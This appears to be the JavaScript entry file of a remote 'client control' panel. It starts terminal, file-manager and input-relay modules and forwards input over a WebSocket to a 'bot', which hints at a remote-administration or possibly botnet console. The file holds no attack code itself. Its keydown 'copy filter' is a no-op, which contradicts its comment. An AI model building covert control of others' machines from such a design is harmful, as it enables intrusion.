// frontend\client_control\js\client_control.js
import { AppState } from './modules/core/states.js';
import { initSidebar } from './modules/ui/sidebar.js';
import { initHeaderControls } from './modules/ui/header.js';
import { initFullscreen } from './modules/ui/fullscreen.js';
import { initControlConnection } from './modules/websocket/connection.js';
import { initInputHandlers } from './modules/features/input_handler.js';
import { initTerminal } from './modules/features/terminal.js';
import { initFileManager } from './modules/features/files.js';

// Инициализация всех систем управления клиентом после загрузки DOM
document.addEventListener('DOMContentLoaded', () => {
  const isInput = (el) => ['INPUT', 'TEXTAREA'].includes(el.tagName) || el.contentEditable === 'true';

  AppState.reset();
  window.AppState = AppState;

  // Отключение контекстного меню
  document.oncontextmenu = (e) => e.preventDefault();

  // Глобальный фильтр клавиш для корректной работы копирования в полях ввода
  document.addEventListener('keydown', (e) => {
    const isTyping = isInput(e.target);
    const isCopyPaste = e.ctrlKey && ['c', 'v'].includes(e.key);

    (isTyping && isCopyPaste) && null; 
  }, true);

  // Запуск модулей интерфейса и системных функций
  [
    initSidebar,
    initHeaderControls,
    initFullscreen,
    initTerminal,
    initFileManager,
    initControlConnection
  ].forEach(init => init());

  // Настройка передачи команд ввода в WebSocket-канал бота
  initInputHandlers((mod, pay) => window.sendToBot?.(mod, pay));
});